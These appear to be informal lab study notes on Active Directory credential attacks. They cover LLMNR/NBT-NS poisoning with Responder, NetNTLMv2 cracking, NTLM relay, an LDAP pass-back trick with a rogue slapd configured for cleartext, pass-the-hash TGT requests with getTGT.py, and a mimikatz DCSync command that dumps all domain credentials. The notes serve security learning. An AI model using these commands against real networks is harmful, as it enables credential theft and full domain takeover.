


## Authentication Relays
when **Windows Resolver** (OS network stack) got nothing from DNS cloud use LLMNR, NBT-NS or WPAD 
these protocols send a broadcast message to ask all the LAN about the destination. 

as a good bad hacker i will say yes it is me so it will make NTLM auth with me. i will send challenge and hr will send the challenge response, I will use Hashcat to crack this **NetNTLMv2 challenge/response**, which is computed using the user’s NT hash. 

i use [responder](https://github.com/lgandx/Responder) for this. 

if the SMB or whatever the service that use NTLM deosn't enforce signature i can use MITM. but it will fail if the user have no permission on the object that we want to access 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png)  

## LDAP Authentication & Pass-back Attack
Applications can use **LDAP** to authenticate directly with Active Directory.  
Instead of letting Windows handle NTLM, the app itself sends username/password to AD for validation.

Those apps need **AD credentials** stored in config (often service accounts). Sometimes they’re stored in plain text. If you compromise the app server, you may find them directly.

Instead of stealing the config file, you can trick the device:

1. Change its LDAP server setting (e.g. in printer web panel) from the real DC IP → your attacker IP.
2. It sends the LDAP username/password to your rogue LDAP server.
3. You capture the creds in **cleartext**.

you have to start slapd service (LDAP server) 

and use these configration to make it use plain passwords only 

```bash
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
```

# TGT grant using the hash only 

```bash
getTGT.py FOREST.LAB/menna:palestine -dc-ip 192.168.1.100
getTGT.py FOREST.LAB/menna -hashes :37f9beff5ca917436cf4f0fb32856b4a -dc-ip 192.168.1.100
```

extract all the domain creds with, it will fake a backup (DCSync).  
```bash 
lsadump::dcsync /domain:forest.lab /all
```




